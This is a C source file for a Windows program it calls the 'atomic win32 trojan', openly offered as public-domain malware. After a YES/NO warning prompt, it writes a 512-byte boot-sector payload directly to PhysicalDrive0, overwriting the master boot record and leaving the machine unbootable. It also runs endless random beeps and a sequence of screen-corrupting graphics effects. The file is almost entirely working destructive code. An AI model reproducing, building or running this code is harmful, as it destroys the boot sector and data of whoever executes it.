/**
 * Public domain
*/

#include <time.h>
#include <windows.h>

char data[512] = {
    0xb4, 0x00, 0xb0, 0x13, 0xcd, 0x10, 0xb0, 0x01, 0xb7, 0x00,
    0xb9, 0x00, 0x00, 0xba, 0x00, 0x00, 0xb4, 0x0c, 0xcd, 0x10,
    0x41, 0xfe, 0xc0, 0xeb, 0xf7, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x55, 0xaa
};

VOID P0Payload(LPVOID lpThreadParameter)
{
    int r0, r1;

    srand(time(NULL));

    while (TRUE) {
        r0 = rand() % 1000;
        r1 = rand() % 1200;
        Beep(r0, r1);

        r0 = rand() % 500;
        r1 = rand() % 510;
        Beep(r0, r1);
    }
}

VOID P1Payload(LPVOID lpThreadParameter)
{
    HANDLE hHandle;
    DWORD dWord;

    hHandle = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 3, 0, OPEN_EXISTING, 0, 0
    );
    WriteFile(hHandle, &data, 512, &dWord, 0);

    CloseHandle(hHandle);
}

VOID P2Payload(LPVOID lpThreadParameter)
{
    HDC hHDC;
    HBRUSH hHbrush;
    HBITMAP hHbitmap;
    LPVOID lpBits;    
    int r0, r1, r2, r3, nWidth, nHeight, nHW;

    nWidth = GetSystemMetrics(SM_CXSCREEN);
    nHeight = GetSystemMetrics(SM_CYSCREEN);
    lpBits = VirtualAlloc(NULL, 4 * nWidth * (nHeight + 1), MEM_COMMIT | MEM_RESERVE, MEM_PHYSICAL);

    r0 = 2000;
    nHW = 4 * nWidth * nHeight;

    do {
        hHDC = CreateCompatibleDC(GetDC(NULL));
        r1 = (rand() % 255) << 8;
        r2 = (r1 | (rand() % 255)) << 8;
        hHbrush = CreateSolidBrush(r2 | (rand() % 255));
        hHbitmap = CreateBitmap(nWidth, nHeight, 1, 32, lpBits);
        GetBitmapBits(hHbitmap, nHW, lpBits);
        SelectObject(hHDC, hHbitmap);
        BitBlt(hHDC, 0, 0, nWidth, nHeight, hHDC, 0, 0, 0xCC0020u);
        SelectObject(hHDC, hHbrush);
        r3 = 3;

        do {
            PatBlt(hHDC, 0, 0, nWidth, nHeight, 0x5A0049u);
            BitBlt(hHDC, rand() % 21 - 10, rand() % 21 - 10, nWidth, nHeight, hHDC, 0, 0, 0xCC0020u);
        } while (r3--);

        SetBitmapBits(hHbitmap, nHW, lpBits);
        DeleteObject(hHbitmap);
        DeleteObject(hHDC);
    } while (r0--);
}

VOID P3Payload(LPVOID lpThreadParameter)
{
    HDC hHDC;
    HBRUSH hHbrush;
    HBITMAP hHbitmap;
    LPVOID lpBits;
    int r0, r1, nWidth, nHeight, nHW;

    RedrawWindow(0, 0, 0, 133);
    nWidth = GetSystemMetrics(SM_CXSCREEN);
    nHeight = GetSystemMetrics(SM_CYSCREEN);

    lpBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), MEM_COMMIT | MEM_RESERVE, MEM_PHYSICAL);
    nHW = 4 * nWidth * nHeight;

    while (TRUE) {
        RedrawWindow(0, 0, 0, 133);
        hHDC = CreateCompatibleDC(GetDC(NULL));
        hHbitmap = CreateBitmap(nWidth, nHeight, 1, 32, lpBits);
        GetBitmapBits(hHbitmap, nHW, lpBits);
        SelectObject(hHDC, hHbitmap);
        r0 = ((rand() % 255) << 8 | (rand() % 255)) << 8;
        hHbrush = CreateHatchBrush(4, r0 | (rand() % 255));
        BitBlt(hHDC, 0, 0, nWidth, nHeight, hHDC, 0, 0, 0xCC0020u);
        SelectObject(hHDC, hHbrush);
        r1 = 10;

        do {
            BitBlt(hHDC, rand() % 10 - 5, rand() % 10 - 5, nWidth, nHeight, hHDC, 0, 0, 0xCC0020u);
            PatBlt(hHDC, 0, 0, nWidth, nHeight, 0x5A0049u);
        } while (r1--);

        DeleteObject(hHbitmap);
        DeleteObject(hHDC);
    }
}

VOID P4Payload(LPVOID lpThreadParameter)
{
    HDC hHDC;
    HBITMAP hHbitmap;
    LPVOID lpBits;
    int r0, nWidth, nHeight;

    nWidth = GetSystemMetrics(SM_CXSCREEN);
    nHeight = GetSystemMetrics(SM_CYSCREEN);
    lpBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), MEM_COMMIT | MEM_RESERVE, MEM_PHYSICAL);

    while (TRUE) {
        RedrawWindow(0, 0, 0, 133);
        hHDC = CreateCompatibleDC(GetDC(NULL));
        hHbitmap = CreateBitmap(nWidth, nHeight, 1, 32, lpBits);
        GetBitmapBits(hHbitmap, 4 * nWidth * nHeight, lpBits);
        SelectObject(hHDC, hHbitmap);
        BitBlt(hHDC, 0, 0, nWidth, nHeight, hHDC, 0, 0, 0xCC0020u);
        r0 = 3;

        do {
            BitBlt(hHDC, 0, 0, nWidth, nHeight, hHDC, 1, 1, 0x823F7Fu);
        } while (r0--);

        DeleteObject(hHbitmap);
        DeleteObject(hHDC);
    }
}

VOID P5Payload(LPVOID lpThreadParameter)
{
    HICON hHicon;
    HBITMAP hHbitmap;
    HDC hHDC;
    LPVOID lpBits;
    int r0, r1, r2, r3, c, nHeight, nWidth, nHW;

    nWidth = GetSystemMetrics(SM_CXSCREEN);
    nHeight = GetSystemMetrics(SM_CYSCREEN);

    lpBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), MEM_COMMIT | MEM_RESERVE, MEM_PHYSICAL);
    nHW = 4 * nWidth * nHeight;

    while (TRUE) {
        RedrawWindow(0, 0, 0, 0x85u);
        hHDC = CreateCompatibleDC(GetDC(NULL));
        hHbitmap = CreateBitmap(nWidth, nHeight, 1, 32, lpBits);
        GetBitmapBits(hHbitmap, nHW, lpBits);
        SelectObject(hHDC, hHbitmap);
        BitBlt(hHDC, 0, 0, nWidth, nHeight, hHDC, 0, 0, 0xCC0020u);
        r0 = ((rand() % 255) << 8 | (rand() % 255)) << 8;
        SetBkColor(hHDC, r0 | (rand() % 255));
        r1 = ((rand() % 255) << 8 | (rand() % 255)) << 8;
        SetTextColor(hHDC, r1 | (rand() % 255));
        c = 1000;

        do {
            r2 = rand() % nHeight;
            TextOutA(hHDC, rand() % nWidth, r2, "attomic!", 10);
            hHicon = LoadIconA(NULL, (LPCSTR)0x7F01);
            r3 = rand() % nHeight;
            DrawIcon(hHDC, rand() % nWidth, r3, hHicon);
        } while (c--);

        DeleteObject(hHbitmap);
        DeleteObject(hHDC);
    }
}

VOID P6Payload(LPVOID lpThreadParameter)
{
    HDC hHDC;
    HBITMAP hHbitmap;
    HBRUSH hHbrush;
    HRGN hRGN;
    LPVOID lpBits;
    int r0, nHeight, nWidth;

    RedrawWindow(0, 0, 0, 0x85u);
    srand(time(NULL));

    nWidth = GetSystemMetrics(SM_CXSCREEN);
    nHeight = GetSystemMetrics(SM_CYSCREEN);

    lpBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), MEM_COMMIT | MEM_RESERVE, MEM_PHYSICAL);

    while (TRUE) {
        hHDC = CreateCompatibleDC(GetDC(NULL));
        hHbitmap = CreateBitmap(nWidth, nHeight, 1, 32, lpBits);
        GetBitmapBits(hHbitmap, 4 * nWidth * nHeight, lpBits);
        SelectObject(hHDC, hHbitmap);
        BitBlt(hHDC, 0, 0, nWidth, nHeight, hHDC, 0, 0, 0xCC0020u);
        r0 = ((rand() % 255) << 8 | (rand() % 255)) << 8;
        hHbrush = CreateSolidBrush(r0 | (rand() % 255));
        hRGN = CreateEllipticRgn(rand() % nWidth, rand() % nHeight, 6, 6);
        FillRgn(hHDC, hRGN, hHbrush);

        DeleteObject(hHbitmap);
        DeleteObject(hHDC);
    }
}

VOID P7Payload(LPVOID lpThreadParameter)
{
    HBITMAP hHbitmap;
    HBRUSH hHbrush;
    HDC hHDC;
    LPVOID lpBits;

    int r0, r1, i, nHeight, nWidth;

    RedrawWindow(0, 0, 0, 0x85u);
    srand(time(0));

    nWidth = GetSystemMetrics(SM_CXSCREEN);
    nHeight = GetSystemMetrics(SM_CYSCREEN);

    lpBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), MEM_COMMIT | MEM_RESERVE, MEM_PHYSICAL);
    i = 0;

    while (TRUE) {
        hHDC = CreateCompatibleDC(GetDC(NULL));
        hHbitmap = CreateBitmap(nWidth, nHeight, 1, 32, lpBits);
        GetBitmapBits(hHbitmap, 4 * nWidth * nHeight, lpBits);
        SelectObject(hHDC, hHbitmap);
        BitBlt(hHDC, 0, 0, nWidth, nHeight, hHDC, 0, 0, 0xCC0020u);
        r0 = ((rand() % 255 - i) << 8 | (i + rand() % 255)) << 8;
        r1 = (r0 | (rand() % 255 - i)) << 8;
        hHbrush = CreateSolidBrush(r1 | (i + rand() % 255));
        SelectObject(hHDC, hHbrush);
        PatBlt(hHDC, 0, 0, rand() % nWidth, rand() % nHeight, 0x5A0049u);
        BitBlt(hHDC, 6, 6, nWidth, nHeight, hHDC, 0, 0, 0xCC0020u);

        DeleteObject(hHbitmap);
        DeleteObject(hHDC);

        i++;
    }
}

int WINAPI WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nShowCmd
)
{
    int result;
    HANDLE hThread;

    result = MessageBoxA(NULL,
        "You are running atomic.exe win32 trojan,this software cause irreversible damage to your machine.\n"
        "The creator is not responsible for your data loss.\n"
        "Press YES to run or NO to exit",
        "atomic win32 trojan",
        MB_YESNO
    );

    if (result == IDYES) {
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)P0Payload, 0, 0, 0);
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)P1Payload, 0, 0, 0);
        Sleep(1000);

        hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)P2Payload, 0, 0, 0);
        Sleep(20000);
        TerminateThread(hThread, 0);

        hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)P3Payload, 0, 0, 0);
        Sleep(20000);
        TerminateThread(hThread, 0);

        hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)P4Payload, 0, 0, 0);
        Sleep(20000);
        TerminateThread(hThread, 0);

        hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)P5Payload, 0, 0, 0);
        Sleep(20000);
        TerminateThread(hThread, 0);

        hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)P6Payload, 0, 0, 0);
        Sleep(20000);
        TerminateThread(hThread, 0);

        hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)P7Payload, 0, 0, 0);
        Sleep(20000);
        TerminateThread(hThread, 0);
    }

    return result;
}
